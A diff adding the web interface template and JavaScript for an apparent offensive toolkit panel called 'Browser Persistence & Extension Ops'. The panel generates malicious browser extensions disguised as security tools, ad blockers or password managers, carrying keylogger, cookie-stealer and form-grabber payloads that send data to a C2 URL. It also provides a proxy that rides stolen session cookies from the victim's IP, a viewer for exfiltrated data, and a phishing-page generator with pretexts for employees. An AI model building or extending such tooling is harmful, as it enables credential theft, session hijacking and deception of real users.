@@ -1,0 +1,863 @@
+{% extends "base.html" %}
+
+{% block title %}Browser Persistence & Extension Ops - CyberPulse{% endblock %}
+
+{% block content %}
+<div class="space-y-6">
+    <!-- Header -->
+    <div class="flex items-center justify-between">
+        <div>
+            <h1 class="text-3xl font-bold text-white flex items-center gap-3">
+                <span class="text-4xl">🌐</span>
+                Browser Persistence & Extension Ops
+            </h1>
+            <p class="text-gray-400 mt-2">İşletim sistemi temizlense bile tarayıcıda yaşamak</p>
+        </div>
+        <div class="flex items-center gap-3">
+            <span class="px-3 py-1 text-xs font-bold bg-gradient-to-r from-purple-600 to-pink-600 text-white rounded-full animate-pulse">
+                STEALTH
+            </span>
+            <span class="px-3 py-1 text-xs font-bold bg-gradient-to-r from-green-600 to-emerald-600 text-white rounded-full">
+                AV BYPASS
+            </span>
+        </div>
+    </div>
+
+    <!-- Stats Overview -->
+    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+        <div class="glass rounded-xl p-4 border border-purple-500/30">
+            <div class="flex items-center justify-between">
+                <div>
+                    <p class="text-gray-400 text-sm">Extensions Generated</p>
+                    <p class="text-2xl font-bold text-white" id="statsExtensions">0</p>
+                </div>
+                <div class="text-3xl">🧩</div>
+            </div>
+        </div>
+        <div class="glass rounded-xl p-4 border border-cyan-500/30">
+            <div class="flex items-center justify-between">
+                <div>
+                    <p class="text-gray-400 text-sm">Active Sessions</p>
+                    <p class="text-2xl font-bold text-white" id="statsSessions">0</p>
+                </div>
+                <div class="text-3xl">🍪</div>
+            </div>
+        </div>
+        <div class="glass rounded-xl p-4 border border-green-500/30">
+            <div class="flex items-center justify-between">
+                <div>
+                    <p class="text-gray-400 text-sm">Proxy Tunnels</p>
+                    <p class="text-2xl font-bold text-white" id="statsTunnels">0</p>
+                </div>
+                <div class="text-3xl">🚇</div>
+            </div>
+        </div>
+        <div class="glass rounded-xl p-4 border border-red-500/30">
+            <div class="flex items-center justify-between">
+                <div>
+                    <p class="text-gray-400 text-sm">Data Collected</p>
+                    <p class="text-2xl font-bold text-white" id="statsCollected">0</p>
+                </div>
+                <div class="text-3xl">📊</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="glass rounded-xl border border-gray-700/50">
+        <div class="border-b border-gray-700/50">
+            <nav class="flex space-x-0">
+                <button onclick="switchTab('extension')" id="tab-extension" 
+                        class="tab-btn px-6 py-4 text-sm font-medium border-b-2 border-purple-500 text-purple-400 bg-purple-500/10">
+                    <span class="mr-2">🧩</span> Extension Factory
+                </button>
+                <button onclick="switchTab('proxy')" id="tab-proxy" 
+                        class="tab-btn px-6 py-4 text-sm font-medium border-b-2 border-transparent text-gray-400 hover:text-white">
+                    <span class="mr-2">🍪</span> Cookie Replay Proxy
+                </button>
+                <button onclick="switchTab('collected')" id="tab-collected" 
+                        class="tab-btn px-6 py-4 text-sm font-medium border-b-2 border-transparent text-gray-400 hover:text-white">
+                    <span class="mr-2">📊</span> Collected Data
+                </button>
+                <button onclick="switchTab('social')" id="tab-social" 
+                        class="tab-btn px-6 py-4 text-sm font-medium border-b-2 border-transparent text-gray-400 hover:text-white">
+                    <span class="mr-2">🎭</span> Social Engineering
+                </button>
+            </nav>
+        </div>
+
+        <!-- Tab Content -->
+        <div class="p-6">
+            <!-- Extension Factory Tab -->
+            <div id="content-extension" class="tab-content">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <!-- Generator Form -->
+                    <div class="space-y-4">
+                        <h3 class="text-lg font-semibold text-white flex items-center gap-2">
+                            <span>🛠️</span> Malicious Extension Generator
+                        </h3>
+                        
+                        <div class="space-y-4">
+                            <!-- Extension Type -->
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Extension Disguise</label>
+                                <select id="extType" class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-purple-500 focus:outline-none">
+                                    <option value="security_scanner">🛡️ SecureGuard Pro (Security Scanner)</option>
+                                    <option value="ad_blocker">🚫 AdBlock Ultimate</option>
+                                    <option value="dark_mode">🌙 Dark Reader Pro</option>
+                                    <option value="password_manager">🔐 SecureVault Password Manager</option>
+                                    <option value="vpn_proxy">🔒 FastVPN Secure Proxy</option>
+                                    <option value="grammar_checker">✍️ GrammarPro Assistant</option>
+                                    <option value="screenshot_tool">📸 ScreenCapture Pro</option>
+                                    <option value="translator">🌐 InstantTranslate Pro</option>
+                                    <option value="coupon_finder">💰 CouponHunter</option>
+                                </select>
+                            </div>
+
+                            <!-- Payload Type -->
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Payload Type</label>
+                                <select id="payloadType" class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-purple-500 focus:outline-none">
+                                    <option value="full_suite">💀 Full Suite (All Payloads)</option>
+                                    <option value="keylogger">⌨️ Keylogger</option>
+                                    <option value="cookie_stealer">🍪 Cookie Stealer</option>
+                                    <option value="form_grabber">📝 Form Grabber</option>
+                                    <option value="clipboard_monitor">📋 Clipboard Monitor</option>
+                                    <option value="screenshot">📸 Screenshot Capture</option>
+                                </select>
+                            </div>
+
+                            <!-- C2 URL -->
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">C2 Exfiltration URL</label>
+                                <input type="text" id="c2Url" value="http://localhost:8080/browser-persistence" 
+                                       class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-purple-500 focus:outline-none"
+                                       placeholder="https://your-c2-server.com">
+                            </div>
+
+                            <!-- Exfil Interval -->
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Exfiltration Interval (seconds)</label>
+                                <input type="number" id="exfilInterval" value="30" min="5" max="3600"
+                                       class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-purple-500 focus:outline-none">
+                            </div>
+
+                            <!-- Target Domains -->
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">
+                                    High-Value Target Domains
+                                    <button onclick="loadDefaultTargets()" class="ml-2 text-xs text-purple-400 hover:text-purple-300">[Load Defaults]</button>
+                                </label>
+                                <textarea id="targetDomains" rows="4" 
+                                          class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-purple-500 focus:outline-none font-mono text-sm"
+                                          placeholder="mail.google.com&#10;console.aws.amazon.com&#10;banking.example.com"></textarea>
+                            </div>
+
+                            <!-- Browser Type -->
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Target Browser</label>
+                                <select id="browserType" class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-purple-500 focus:outline-none">
+                                    <option value="chrome">🌐 Chrome</option>
+                                    <option value="edge">📘 Edge</option>
+                                    <option value="brave">🦁 Brave</option>
+                                    <option value="opera">🔴 Opera</option>
+                                    <option value="vivaldi">🟣 Vivaldi</option>
+                                </select>
+                            </div>
+
+                            <!-- Generate Button -->
+                            <button onclick="generateExtension()" 
+                                    class="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-semibold py-3 px-6 rounded-lg transition-all duration-200 flex items-center justify-center gap-2">
+                                <span>🔨</span> Generate Malicious Extension
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Preview & Download -->
+                    <div class="space-y-4">
+                        <h3 class="text-lg font-semibold text-white flex items-center gap-2">
+                            <span>📦</span> Generated Extension
+                        </h3>
+                        
+                        <div id="extensionPreview" class="glass rounded-xl p-4 border border-gray-600/50 min-h-[400px]">
+                            <div class="flex flex-col items-center justify-center h-full text-gray-500">
+                                <span class="text-6xl mb-4">🧩</span>
+                                <p>Generated extension will appear here</p>
+                            </div>
+                        </div>
+
+                        <!-- Extension Info (hidden initially) -->
+                        <div id="extensionInfo" class="hidden space-y-4">
+                            <div class="glass rounded-xl p-4 border border-green-500/30">
+                                <h4 class="text-green-400 font-semibold mb-3">✅ Extension Generated Successfully</h4>
+                                <div class="grid grid-cols-2 gap-2 text-sm">
+                                    <div class="text-gray-400">Name:</div>
+                                    <div class="text-white" id="genExtName">-</div>
+                                    <div class="text-gray-400">Version:</div>
+                                    <div class="text-white" id="genExtVersion">-</div>
+                                    <div class="text-gray-400">Extension ID:</div>
+                                    <div class="text-white font-mono text-xs" id="genExtId">-</div>
+                                </div>
+                            </div>
+
+                            <div class="flex gap-2">
+                                <button onclick="downloadExtension()" 
+                                        class="flex-1 bg-green-600 hover:bg-green-500 text-white font-semibold py-2 px-4 rounded-lg transition-all duration-200 flex items-center justify-center gap-2">
+                                    <span>⬇️</span> Download ZIP
+                                </button>
+                                <button onclick="previewManifest()" 
+                                        class="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-semibold py-2 px-4 rounded-lg transition-all duration-200 flex items-center justify-center gap-2">
+                                    <span>👁️</span> Preview
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Capabilities Info -->
+                <div class="mt-6 grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div class="glass rounded-xl p-4 border border-purple-500/20">
+                        <h4 class="text-purple-400 font-semibold mb-2">⌨️ Keylogger</h4>
+                        <p class="text-gray-400 text-sm">Captures all keystrokes in input fields including passwords. Sends data in batches to avoid detection.</p>
+                    </div>
+                    <div class="glass rounded-xl p-4 border border-cyan-500/20">
+                        <h4 class="text-cyan-400 font-semibold mb-2">🍪 Cookie Stealer</h4>
+                        <p class="text-gray-400 text-sm">Steals all cookies including httpOnly via chrome.cookies API. Extracts session tokens automatically.</p>
+                    </div>
+                    <div class="glass rounded-xl p-4 border border-green-500/20">
+                        <h4 class="text-green-400 font-semibold mb-2">📝 Form Grabber</h4>
+                        <p class="text-gray-400 text-sm">Hooks form submissions and AJAX requests. Captures login forms, payment info, and more.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Cookie Replay Proxy Tab -->
+            <div id="content-proxy" class="tab-content hidden">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <!-- Session Creator -->
+                    <div class="space-y-4">
+                        <h3 class="text-lg font-semibold text-white flex items-center gap-2">
+                            <span>🍪</span> Create Session Riding Proxy
+                        </h3>
+                        
+                        <div class="glass rounded-xl p-4 border border-cyan-500/30 mb-4">
+                            <p class="text-cyan-400 text-sm">
+                                <strong>Session Riding:</strong> Instead of copying cookies to your browser, 
+                                create a reverse proxy tunnel. Your traffic appears from victim's IP - 
+                                no location alerts triggered!
+                            </p>
+                        </div>
+
+                        <div class="space-y-4">
+                            <!-- Domain -->
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Target Domain</label>
+                                <input type="text" id="proxyDomain" 
+                                       class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-cyan-500 focus:outline-none"
+                                       placeholder="mail.google.com">
+                            </div>
+
+                            <!-- Cookies -->
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Stolen Cookies</label>
+                                <textarea id="proxyCookies" rows="5" 
+                                          class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-cyan-500 focus:outline-none font-mono text-sm"
+                                          placeholder="SSID=abc123; SID=xyz789; HSID=..."></textarea>
+                            </div>
+
+                            <!-- User Agent -->
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Victim User-Agent</label>
+                                <input type="text" id="proxyUserAgent" 
+                                       class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-cyan-500 focus:outline-none font-mono text-sm"
+                                       value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36">
+                            </div>
+
+                            <!-- Victim IP -->
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Victim IP Address</label>
+                                <input type="text" id="proxyVictimIP" 
+                                       class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-cyan-500 focus:outline-none"
+                                       placeholder="192.168.1.100">
+                            </div>
+
+                            <!-- Create Button -->
+                            <button onclick="createProxySession()" 
+                                    class="w-full bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-semibold py-3 px-6 rounded-lg transition-all duration-200 flex items-center justify-center gap-2">
+                                <span>🚇</span> Create Proxy Tunnel
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Active Sessions -->
+                    <div class="space-y-4">
+                        <h3 class="text-lg font-semibold text-white flex items-center gap-2">
+                            <span>📡</span> Active Sessions
+                        </h3>
+                        
+                        <div id="activeSessions" class="space-y-3">
+                            <div class="glass rounded-xl p-4 border border-gray-600/50 text-center text-gray-500">
+                                <span class="text-4xl">🔌</span>
+                                <p class="mt-2">No active sessions</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Proxy Configuration (shown when tunnel created) -->
+                <div id="proxyConfig" class="mt-6 hidden">
+                    <h3 class="text-lg font-semibold text-white flex items-center gap-2 mb-4">
+                        <span>⚙️</span> Proxy Configuration
+                    </h3>
+                    
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <!-- Curl Command -->
+                        <div class="glass rounded-xl p-4 border border-gray-600/50">
+                            <h4 class="text-cyan-400 font-semibold mb-2 flex items-center gap-2">
+                                <span>💻</span> cURL Command
+                            </h4>
+                            <pre id="curlCommand" class="bg-gray-900/50 rounded-lg p-3 text-xs text-gray-300 font-mono overflow-x-auto max-h-40"></pre>
+                            <button onclick="copyToClipboard('curlCommand')" class="mt-2 text-xs text-cyan-400 hover:text-cyan-300">📋 Copy</button>
+                        </div>
+
+                        <!-- Python Code -->
+                        <div class="glass rounded-xl p-4 border border-gray-600/50">
+                            <h4 class="text-green-400 font-semibold mb-2 flex items-center gap-2">
+                                <span>🐍</span> Python Code
+                            </h4>
+                            <pre id="pythonCode" class="bg-gray-900/50 rounded-lg p-3 text-xs text-gray-300 font-mono overflow-x-auto max-h-40"></pre>
+                            <button onclick="copyToClipboard('pythonCode')" class="mt-2 text-xs text-green-400 hover:text-green-300">📋 Copy</button>
+                        </div>
+
+                        <!-- Nginx Config -->
+                        <div class="glass rounded-xl p-4 border border-gray-600/50">
+                            <h4 class="text-yellow-400 font-semibold mb-2 flex items-center gap-2">
+                                <span>⚡</span> Nginx Config
+                            </h4>
+                            <button onclick="downloadNginxConfig()" class="bg-yellow-600 hover:bg-yellow-500 text-white px-4 py-2 rounded-lg text-sm">
+                                ⬇️ Download nginx.conf
+                            </button>
+                        </div>
+
+                        <!-- Node.js Proxy -->
+                        <div class="glass rounded-xl p-4 border border-gray-600/50">
+                            <h4 class="text-purple-400 font-semibold mb-2 flex items-center gap-2">
+                                <span>📦</span> Node.js Proxy
+                            </h4>
+                            <button onclick="downloadNodeProxy()" class="bg-purple-600 hover:bg-purple-500 text-white px-4 py-2 rounded-lg text-sm">
+                                ⬇️ Download proxy.js
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Collected Data Tab -->
+            <div id="content-collected" class="tab-content hidden">
+                <div class="space-y-4">
+                    <div class="flex items-center justify-between">
+                        <h3 class="text-lg font-semibold text-white flex items-center gap-2">
+                            <span>📊</span> Exfiltrated Data
+                        </h3>
+                        <button onclick="refreshCollectedData()" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg text-sm flex items-center gap-2">
+                            <span>🔄</span> Refresh
+                        </button>
+                    </div>
+
+                    <div id="collectedDataContainer" class="space-y-4">
+                        <div class="glass rounded-xl p-8 border border-gray-600/50 text-center text-gray-500">
+                            <span class="text-6xl">📭</span>
+                            <p class="mt-4">No data collected yet</p>
+                            <p class="text-sm mt-2">Deploy an extension to start collecting</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Social Engineering Tab -->
+            <div id="content-social" class="tab-content hidden">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <!-- SE Page Generator -->
+                    <div class="space-y-4">
+                        <h3 class="text-lg font-semibold text-white flex items-center gap-2">
+                            <span>🎭</span> Social Engineering Page Generator
+                        </h3>
+                        
+                        <div class="space-y-4">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Company Name</label>
+                                <input type="text" id="seCompanyName" value="IT Security Department"
+                                       class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-pink-500 focus:outline-none">
+                            </div>
+
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Extension Name</label>
+                                <input type="text" id="seExtensionName" value="Corporate Security Extension"
+                                       class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-pink-500 focus:outline-none">
+                            </div>
+
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Download URL</label>
+                                <input type="text" id="seDownloadUrl" placeholder="/browser-persistence/api/extension/download/xxx"
+                                       class="w-full bg-gray-800/50 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-pink-500 focus:outline-none">
+                            </div>
+
+                            <button onclick="generateSocialPage()" 
+                                    class="w-full bg-gradient-to-r from-pink-600 to-red-600 hover:from-pink-500 hover:to-red-500 text-white font-semibold py-3 px-6 rounded-lg transition-all duration-200 flex items-center justify-center gap-2">
+                                <span>🎭</span> Generate Phishing Page
+                            </button>
+                        </div>
+
+                        <!-- Attack Scenarios -->
+                        <div class="mt-6">
+                            <h4 class="text-gray-400 font-semibold mb-3">💡 Attack Scenarios</h4>
+                            <div class="space-y-2 text-sm">
+                                <div class="glass rounded-lg p-3 border border-gray-600/30">
+                                    <strong class="text-purple-400">IT Department Email:</strong>
+                                    <p class="text-gray-400">"Install this mandatory security extension to protect against recent phishing attacks."</p>
+                                </div>
+                                <div class="glass rounded-lg p-3 border border-gray-600/30">
+                                    <strong class="text-cyan-400">Helpdesk Ticket:</strong>
+                                    <p class="text-gray-400">"Your browser needs this update before accessing internal systems."</p>
+                                </div>
+                                <div class="glass rounded-lg p-3 border border-gray-600/30">
+                                    <strong class="text-green-400">Intranet Notice:</strong>
+                                    <p class="text-gray-400">"New corporate policy requires all employees to install VPN extension."</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Preview -->
+                    <div class="space-y-4">
+                        <h3 class="text-lg font-semibold text-white flex items-center gap-2">
+                            <span>👁️</span> Page Preview
+                        </h3>
+                        
+                        <div id="sePreview" class="glass rounded-xl border border-gray-600/50 overflow-hidden">
+                            <iframe id="seIframe" class="w-full h-[500px] bg-gray-900"></iframe>
+                        </div>
+
+                        <div class="flex gap-2">
+                            <button onclick="downloadSocialPage()" id="downloadSeBtn" disabled
+                                    class="flex-1 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 text-white font-semibold py-2 px-4 rounded-lg transition-all duration-200 flex items-center justify-center gap-2">
+                                <span>⬇️</span> Download HTML
+                            </button>
+                            <button onclick="openSocialPage()" id="openSeBtn" disabled
+                                    class="flex-1 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 text-white font-semibold py-2 px-4 rounded-lg transition-all duration-200 flex items-center justify-center gap-2">
+                                <span>🔗</span> Open in Tab
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Warning Banner -->
+    <div class="glass rounded-xl p-4 border border-yellow-500/30 bg-yellow-500/5">
+        <div class="flex items-start gap-3">
+            <span class="text-2xl">⚠️</span>
+            <div>
+                <h4 class="text-yellow-400 font-semibold">AV Bypass Notice</h4>
+                <p class="text-gray-400 text-sm mt-1">
+                    Browser extensions are typically not scanned by antivirus software. This module generates 
+                    Manifest V3 compliant extensions that persist across browser sessions and OS reinstalls 
+                    (if profile syncing is enabled).
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Code Preview Modal -->
+<div id="codeModal" class="fixed inset-0 bg-black/80 hidden items-center justify-center z-50 p-4">
+    <div class="bg-gray-900 rounded-xl border border-gray-700 max-w-4xl w-full max-h-[90vh] overflow-hidden">
+        <div class="flex items-center justify-between p-4 border-b border-gray-700">
+            <h3 class="text-white font-semibold" id="modalTitle">Code Preview</h3>
+            <button onclick="closeModal()" class="text-gray-400 hover:text-white text-2xl">&times;</button>
+        </div>
+        <div class="p-4 overflow-auto max-h-[70vh]">
+            <pre id="modalCode" class="text-sm text-gray-300 font-mono whitespace-pre-wrap"></pre>
+        </div>
+    </div>
+</div>
+
+<script>
+let currentExtensionId = null;
+let currentTunnelId = null;
+let generatedSocialHtml = null;
+
+// Tab switching
+function switchTab(tabName) {
+    // Update tab buttons
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.classList.remove('border-purple-500', 'text-purple-400', 'bg-purple-500/10');
+        btn.classList.add('border-transparent', 'text-gray-400');
+    });
+    
+    const activeTab = document.getElementById(`tab-${tabName}`);
+    activeTab.classList.remove('border-transparent', 'text-gray-400');
+    activeTab.classList.add('border-purple-500', 'text-purple-400', 'bg-purple-500/10');
+    
+    // Update content
+    document.querySelectorAll('.tab-content').forEach(content => {
+        content.classList.add('hidden');
+    });
+    document.getElementById(`content-${tabName}`).classList.remove('hidden');
+}
+
+// Load default high-value targets
+async function loadDefaultTargets() {
+    try {
+        const response = await fetch('/browser-persistence/api/extension/targets');
+        const data = await response.json();
+        
+        if (data.success) {
+            document.getElementById('targetDomains').value = data.targets.join('\n');
+        }
+    } catch (error) {
+        console.error('Error loading targets:', error);
+    }
+}
+
+// Generate extension
+async function generateExtension() {
+    const config = {
+        extension_type: document.getElementById('extType').value,
+        payload_type: document.getElementById('payloadType').value,
+        c2_url: document.getElementById('c2Url').value,
+        exfil_interval: parseInt(document.getElementById('exfilInterval').value),
+        target_domains: document.getElementById('targetDomains').value.split('\n').filter(d => d.trim()),
+        browser: document.getElementById('browserType').value,
+        version: '1.0.0'
+    };
+    
+    try {
+        const response = await fetch('/browser-persistence/api/extension/generate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(config)
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            currentExtensionId = data.extension.extension_id;
+            
+            // Show extension info
+            document.getElementById('genExtName').textContent = data.extension.name;
+            document.getElementById('genExtVersion').textContent = data.extension.version;
+            document.getElementById('genExtId').textContent = data.extension.extension_id;
+            
+            // Update preview
+            document.getElementById('extensionPreview').innerHTML = `
+                <div class="space-y-3">
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="w-12 h-12 bg-gradient-to-br from-purple-600 to-pink-600 rounded-xl flex items-center justify-center text-2xl">🛡️</div>
+                        <div>
+                            <h4 class="text-white font-semibold">${data.extension.name}</h4>
+                            <p class="text-gray-400 text-sm">v${data.extension.version}</p>
+                        </div>
+                    </div>
+                    <div class="text-sm text-gray-400">
+                        <p class="mb-2"><strong class="text-white">Files:</strong></p>
+                        <ul class="space-y-1 font-mono text-xs">
+                            ${data.extension.files.map(f => `<li class="text-gray-500">📄 ${f}</li>`).join('')}
+                        </ul>
+                    </div>
+                </div>
+            `;
+            
+            document.getElementById('extensionInfo').classList.remove('hidden');
+            
+            // Update social engineering download URL
+            document.getElementById('seDownloadUrl').value = `/browser-persistence/api/extension/download/${currentExtensionId}`;
+            
+            // Update stats
+            updateStats();
+            
+        } else {
+            alert('Error: ' + data.error);
+        }
+    } catch (error) {
+        alert('Error generating extension: ' + error.message);
+    }
+}
+
+// Download extension
+function downloadExtension() {
+    if (!currentExtensionId) return;
+    window.location.href = `/browser-persistence/api/extension/download/${currentExtensionId}`;
+}
+
+// Preview manifest
+async function previewManifest() {
+    if (!currentExtensionId) return;
+    
+    try {
+        const response = await fetch(`/browser-persistence/api/extension/preview/${currentExtensionId}/manifest.json`);
+        const content = await response.text();
+        
+        document.getElementById('modalTitle').textContent = 'manifest.json';
+        document.getElementById('modalCode').textContent = content;
+        document.getElementById('codeModal').classList.remove('hidden');
+        document.getElementById('codeModal').classList.add('flex');
+    } catch (error) {
+        alert('Error loading preview: ' + error.message);
+    }
+}
+
+// Create proxy session
+async function createProxySession() {
+    const config = {
+        domain: document.getElementById('proxyDomain').value,
+        cookies: document.getElementById('proxyCookies').value,
+        user_agent: document.getElementById('proxyUserAgent').value,
+        victim_ip: document.getElementById('proxyVictimIP').value
+    };
+    
+    if (!config.domain || !config.cookies) {
+        alert('Domain and cookies are required');
+        return;
+    }
+    
+    try {
+        // Create session
+        const sessionResponse = await fetch('/browser-persistence/api/proxy/sessions', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(config)
+        });
+        
+        const sessionData = await sessionResponse.json();
+        
+        if (sessionData.success) {
+            // Create tunnel
+            const tunnelResponse = await fetch('/browser-persistence/api/proxy/tunnel', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ session_id: sessionData.session.session_id })
+            });
+            
+            const tunnelData = await tunnelResponse.json();
+            
+            if (tunnelData.success) {
+                currentTunnelId = tunnelData.tunnel.tunnel_id;
+                
+                // Update UI
+                displayProxyConfig(tunnelData.config);
+                refreshSessions();
+                updateStats();
+            }
+        } else {
+            alert('Error: ' + sessionData.error);
+        }
+    } catch (error) {
+        alert('Error creating proxy: ' + error.message);
+    }
+}
+
+// Display proxy configuration
+function displayProxyConfig(config) {
+    document.getElementById('curlCommand').textContent = config.curl_command;
+    document.getElementById('pythonCode').textContent = config.python_code;
+    document.getElementById('proxyConfig').classList.remove('hidden');
+}
+
+// Refresh sessions list
+async function refreshSessions() {
+    try {
+        const response = await fetch('/browser-persistence/api/proxy/sessions');
+        const data = await response.json();
+        
+        const container = document.getElementById('activeSessions');
+        
+        if (data.success && data.sessions.length > 0) {
+            container.innerHTML = data.sessions.map(session => `
+                <div class="glass rounded-xl p-4 border border-cyan-500/30">
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="text-cyan-400 font-semibold">${session.domain}</span>
+                        <span class="text-xs ${session.tunnel_active ? 'text-green-400' : 'text-gray-400'}">
+                            ${session.tunnel_active ? '🟢 Active' : '⚪ No Tunnel'}
+                        </span>
+                    </div>
+                    <div class="text-xs text-gray-400 space-y-1">
+                        <p>IP: ${session.victim_ip}</p>
+                        <p>Cookies: ${session.cookie_count}</p>
+                        ${session.tunnel_port ? `<p>Port: ${session.tunnel_port}</p>` : ''}
+                    </div>
+                </div>
+            `).join('');
+        }
+    } catch (error) {
+        console.error('Error refreshing sessions:', error);
+    }
+}
+
+// Download nginx config
+async function downloadNginxConfig() {
+    if (!currentTunnelId) return;
+    
+    const response = await fetch(`/browser-persistence/api/proxy/nginx/${currentTunnelId}`);
+    const content = await response.text();
+    
+    const blob = new Blob([content], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'nginx_proxy.conf';
+    a.click();
+}
+
+// Download Node.js proxy
+async function downloadNodeProxy() {
+    if (!currentTunnelId) return;
+    
+    const response = await fetch(`/browser-persistence/api/proxy/nodejs/${currentTunnelId}`);
+    const content = await response.text();
+    
+    const blob = new Blob([content], { type: 'application/javascript' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'proxy.js';
+    a.click();
+}
+
+// Refresh collected data
+async function refreshCollectedData() {
+    try {
+        const response = await fetch('/browser-persistence/api/collected');
+        const data = await response.json();
+        
+        const container = document.getElementById('collectedDataContainer');
+        
+        if (data.success && data.count > 0) {
+            container.innerHTML = data.data.map((item, idx) => `
+                <div class="glass rounded-xl p-4 border border-red-500/30">
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="text-red-400 font-semibold">Session: ${item.session_id}</span>
+                        <span class="text-xs text-gray-400">${item.timestamp}</span>
+                    </div>
+                    <pre class="text-xs text-gray-300 bg-gray-900/50 rounded p-2 overflow-auto max-h-40">${JSON.stringify(item.data, null, 2)}</pre>
+                </div>
+            `).join('');
+            
+            document.getElementById('statsCollected').textContent = data.count;
+        }
+    } catch (error) {
+        console.error('Error refreshing collected data:', error);
+    }
+}
+
+// Generate social engineering page
+async function generateSocialPage() {
+    const config = {
+        company_name: document.getElementById('seCompanyName').value,
+        extension_name: document.getElementById('seExtensionName').value,
+        download_url: document.getElementById('seDownloadUrl').value,
+        extension_id: currentExtensionId
+    };
+    
+    try {
+        const response = await fetch('/browser-persistence/api/extension/social-engineering', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(config)
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            generatedSocialHtml = data.html;
+            
+            // Preview in iframe
+            const iframe = document.getElementById('seIframe');
+            iframe.srcdoc = data.html;
+            
+            // Enable buttons
+            document.getElementById('downloadSeBtn').disabled = false;
+            document.getElementById('openSeBtn').disabled = false;
+        }
+    } catch (error) {
+        alert('Error generating page: ' + error.message);
+    }
+}
+
+// Download social engineering page
+function downloadSocialPage() {
+    if (!generatedSocialHtml) return;
+    
+    const blob = new Blob([generatedSocialHtml], { type: 'text/html' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'security_update.html';
+    a.click();
+}
+
+// Open social engineering page in new tab
+function openSocialPage() {
+    if (!generatedSocialHtml) return;
+    
+    const blob = new Blob([generatedSocialHtml], { type: 'text/html' });
+    const url = URL.createObjectURL(blob);
+    window.open(url, '_blank');
+}
+
+// Copy to clipboard
+function copyToClipboard(elementId) {
+    const text = document.getElementById(elementId).textContent;
+    navigator.clipboard.writeText(text).then(() => {
+        // Show feedback
+        const btn = event.target;
+        const originalText = btn.textContent;
+        btn.textContent = '✅ Copied!';
+        setTimeout(() => btn.textContent = originalText, 1500);
